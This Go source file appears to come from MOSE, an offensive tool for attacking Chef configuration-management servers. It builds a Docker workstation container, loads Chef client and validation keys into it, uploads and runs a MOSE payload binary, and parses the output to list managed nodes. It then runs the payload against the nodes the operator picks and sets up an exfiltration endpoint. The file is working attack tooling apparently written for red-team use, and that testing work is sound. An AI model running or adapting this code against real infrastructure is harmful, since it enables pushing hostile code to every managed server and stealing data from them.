// Copyright 2020 National Technology & Engineering Solutions of Sandia, LLC (NTESS).
// Under the terms of Contract DE-NA0003525 with NTESS,
// the U.S. Government retains certain rights in this software.

package chefutils

import (
	"bytes"
	"context"
	"io"
	"io/ioutil"
	"os"
	"os/signal"
	"path"
	"path/filepath"
	"regexp"
	"strings"
	"text/template"
	"time"

	"github.com/master-of-servers/mose/pkg/moseutils"
	"github.com/master-of-servers/mose/pkg/userinput"

	"github.com/rs/zerolog/log"

	"github.com/docker/docker/api/types"
	"github.com/docker/docker/api/types/container"
	"github.com/docker/docker/client"
	"github.com/markbates/pkger"
	"github.com/mholt/archiver"
)

var (
	signalChan chan os.Signal
	userInput  userinput.UserInput
)

type knifeTemplateArgs struct {
	ChefNodeName        string
	ChefClientKey       string
	TargetOrgName       string
	ChefValidationKey   string
	TargetChefServer    string
	TargetValidatorName string
}

func copyFiles(cli *client.Client, id string, files []string, tarLocation string, dockerLocation string) {
	ctx := context.Background()

	tar := archiver.Tar{
		OverwriteExisting: true,
	}

	if err := tar.Archive(files, tarLocation); err != nil {
		log.Fatal().Err(err).Msg("")
	}

	reader, err := os.Open(tarLocation)

	if err != nil {
		log.Fatal().Err(err).Msg("")
	}

	err = cli.CopyToContainer(ctx, id, dockerLocation, reader, types.CopyToContainerOptions{})

	if err != nil {
		log.Fatal().Err(err).Msg("")
	}
}

func simpleRun(cli *client.Client, id string, cmd []string) types.IDResponse {
	ctx := context.Background()

	execID, err := cli.ContainerExecCreate(ctx,
		id,
		types.ExecConfig{
			Cmd: cmd,
		},
	)

	if err != nil {
		log.Fatal().Err(err).Msg("")
	}

	if err = cli.ContainerExecStart(ctx, execID.ID, types.ExecStartCheck{}); err != nil {
		log.Fatal().Err(err).Msg("")
	}

	log.Debug().Msgf("Ran %v in the container.", cmd)

	return execID
}

func build(cli *client.Client) {
	t := archiver.Tar{
		OverwriteExisting: true,
	}

	err := t.Archive([]string{"dockerfiles"}, "tarfiles/dockerfiles.tar")
	if err != nil {
		log.Fatal().Err(err).Msg("")
	}

	dockerBuildContext, err := os.Open("tarfiles/dockerfiles.tar")
	if err != nil {
		log.Fatal().Err(err).Msg("")
	}
	defer dockerBuildContext.Close()

	opts := types.ImageBuildOptions{
		Tags:       []string{userInput.ImageName},
		Dockerfile: "dockerfiles/Dockerfile",
	}

	ibr, err := cli.ImageBuild(context.Background(), dockerBuildContext, opts)

	if err != nil {
		log.Fatal().Err(err).Msg("Error building image")
	}
	defer ibr.Body.Close()

	response, err := ioutil.ReadAll(ibr.Body)
	if err != nil {
		log.Fatal().Err(err).Msg("")
	}
	log.Debug().Msgf("********* %s **********", ibr.OSType)
	log.Debug().Msg(string(response))
}

func run(cli *client.Client) string {
	ctx := context.Background()

	hostconfig := &container.HostConfig{}
	if userInput.Rhost != "" {
		hostconfig = &container.HostConfig{
			ExtraHosts: []string{userInput.Rhost},
		}
	}

	resp, err := cli.ContainerCreate(ctx, &container.Config{
		Image:        userInput.ImageName,
		Tty:          true,
		OpenStdin:    true,
		AttachStdin:  true,
		AttachStdout: true,
		AttachStderr: true,
	},
		hostconfig,
		nil,
		userInput.ContainerName,
	)

	if err != nil {
		panic(err)
	}

	log.Debug().Msgf("Running container with id %v", resp.ID)

	if err = cli.ContainerStart(ctx, resp.ID, types.ContainerStartOptions{}); err != nil {
		log.Fatal().Err(err).Msg("")
	}

	return resp.ID
}

func copyToDocker(cli *client.Client, id string) {
	copyFiles(cli, id, []string{userInput.ChefClientKey, userInput.ChefValidationKey, "dockerfiles/knife.rb"}, "tarfiles/keys_knife.tar", "root/.chef/")

	log.Info().Msg("Running knife ssl fetch, please wait...")
	_ = simpleRun(cli, id, []string{"knife", "ssl", "fetch"})
}

// runMoseInContainer will upload the MOSE payload for a Chef Workstation
// into a container, so we can run it against a Chef Server
func runMoseInContainer(cli *client.Client, id string, osTarget string) {
	ctx := context.Background()

	payloadPath := "payloads/chef-linux"
	if userInput.FilePath != "" {
		payloadPath = userInput.FilePath
	}

	binPath := path.Join("/", path.Base(payloadPath))

	filesToCopy := []string{payloadPath}

	if userInput.FileUpload != "" {
		filesToCopy = append(filesToCopy, path.Join("payloads", path.Base(userInput.FileUpload)))
	}

	copyFiles(cli, id, filesToCopy, "tarfiles/main.tar", "/")

	_ = simpleRun(cli, id, []string{"chmod", "u+x", binPath})

	execID, err := cli.ContainerExecCreate(ctx,
		id,
		types.ExecConfig{
			AttachStderr: true,
			AttachStdin:  true,
			AttachStdout: true,
			Cmd:          []string{binPath, "-i"},
			Tty:          true,
			Detach:       false,
		},
	)

	if err != nil {
		log.Fatal().Err(err).Msg("")
	}

	log.Debug().Msgf("Running container exec and attach for container ID %v", execID.ID)
	hj, err := cli.ContainerExecAttach(ctx, execID.ID, types.ExecStartCheck{Detach: false, Tty: true})

	if err != nil {
		log.Fatal().Err(err).Msg("")
	}

	// Parse the hijacked reader for the agents
	var agentString = regexp.MustCompile("(?ms)BEGIN NODE LIST \\[(?P<nodes>.*)\\] END NODE LIST")
	names := agentString.SubexpNames()

	buf := new(bytes.Buffer)
	_, err = buf.ReadFrom(hj.Reader)
	if err != nil {
		log.Fatal().Err(err).Msg("")
	}
	nodes := make([]string, 0)
	// Print output from running mose in the workstation container
	log.Debug().Msg(buf.String())
	for _, match := range agentString.FindAllStringSubmatch(buf.String(), -1) {
		for groupID, group := range match {
			name := names[groupID]
			if name != "" {
				moseutils.ColorMsgf("The following nodes were identified: %v", group)
				nodes = append(nodes, strings.Split(group, " ")...)
			}
		}
	}

	hj.Close()

	if len(nodes) < 1 {
		log.Log().Msg("No nodes found, exiting...")
		signalChan <- os.Interrupt

		os.Exit(0)
	}
	// Run the MOSE binary on the new workstation that we just created
	agents, err := TargetAgents(nodes, osTarget)
	if err != nil {
		log.Log().Msg("Quitting...")
		signalChan <- os.Interrupt
		os.Exit(1)
	}

	log.Debug().Msgf("Command to be run in the container: %v", append([]string{binPath, "-n"}, agents...))

	execID, err = cli.ContainerExecCreate(ctx,
		id,
		types.ExecConfig{
			AttachStderr: true,
			AttachStdin:  true,
			AttachStdout: true,
			Cmd:          append([]string{binPath, "-n"}, strings.Join(agents[:], " ")),
			Tty:          true,
			Detach:       false,
		},
	)

	if err != nil {
		log.Fatal().Err(err).Msg("")
	}

	log.Debug().Msgf("Running container exec and attach for container ID %v", execID.ID)

	hj, err = cli.ContainerExecAttach(ctx, execID.ID, types.ExecStartCheck{Detach: false, Tty: true})

	if err != nil {
		log.Fatal().Err(err).Msg("")
	}

	if _, err = io.Copy(os.Stdout, hj.Reader); err != nil {
		log.Fatal().Err(err).Msg("")
	}

	hj.Close()
}

func removeContainer(cli *client.Client, id string) {
	ctx := context.Background()
	timeout, _ := time.ParseDuration("10s")
	err := cli.ContainerStop(ctx, id, &timeout)
	if err != nil {
		log.Fatal().Err(err).Msg("")
	}
	err = cli.ContainerRemove(ctx, id, types.ContainerRemoveOptions{Force: true})
	if err != nil {
		log.Fatal().Err(err).Msg("")
	}
}

func monitor(cli *client.Client, id string) {
	cleanupDone := make(chan struct{})
	signal.Notify(signalChan, os.Interrupt)
	go func(cli *client.Client, id string) {
		<-signalChan
		log.Log().Msg("\nReceived an interrupt, stopping services...")
		removeContainer(cli, id)
		close(cleanupDone)
	}(cli, id)
	<-cleanupDone

	os.Exit(0)
}

func generateKnife() {
	knifeArgs := knifeTemplateArgs{
		ChefNodeName:        userInput.ChefNodeName,
		ChefClientKey:       filepath.Base(userInput.ChefClientKey),
		TargetOrgName:       userInput.TargetOrgName,
		ChefValidationKey:   filepath.Base(userInput.ChefValidationKey),
		TargetChefServer:    userInput.TargetChefServer,
		TargetValidatorName: userInput.TargetValidatorName,
	}

	s, err := pkger.Open("/cmd/chef/main/tmpl/knife.tmpl")
	// Build knife.rb using the knife template
	if err != nil {
		log.Fatal().Err(err).Msg("")
	}
	defer s.Close()

	dat := new(strings.Builder)
	_, err = io.Copy(dat, s)

	if err != nil {
		log.Fatal().Err(err).Msg("")
	}

	t, err := template.New("knife").Parse(dat.String())

	if err != nil {
		log.Fatal().Err(err).Msg("")
	}

	f, err := os.Create("dockerfiles/knife.rb")

	if err != nil {
		log.Fatal().Err(err).Msg("")
	}

	err = t.Execute(f, knifeArgs)

	if err != nil {
		log.Fatal().Err(err).Msg("")
	}

	f.Close()
}

// SetupChefWorkstationContainer will configure and stand up a chef workstation container that MOSE can use
func SetupChefWorkstationContainer(input userinput.UserInput) {
	userInput = input
	signalChan = make(chan os.Signal, 1)

	log.Debug().Msgf("Creating exfil endpoint at %v:%v", userInput.LocalIP, userInput.ExfilPort)
	log.Debug().Msgf("Current orgname: %s", userInput.TargetOrgName)

	CreateUploadRoute(userInput)
	log.Info().Msgf("Target organization name: %s", userInput.TargetOrgName)
	generateKnife()
	cli, err := client.NewClientWithOpts(client.WithVersion("1.37"))

	if err != nil {
		log.Fatal().Err(err).Msg("Could not get docker client")
	}
	log.Debug().Msg("Building Workstation container, please wait...")

	build(cli)

	log.Debug().Msg("Starting Workstation container, please wait...")
	id := run(cli)

	go monitor(cli, id)

	log.Debug().Msg("Copying keys and relevant resources to workstation container, please wait...")

	copyToDocker(cli, id)
	log.Debug().Msg("Running MOSE in Workstation container, please wait...")

	runMoseInContainer(cli, id, userInput.OSTarget)

	log.Debug().Msg("Running MOSE in Workstation container, please wait...")

	removeContainer(cli, id)
}
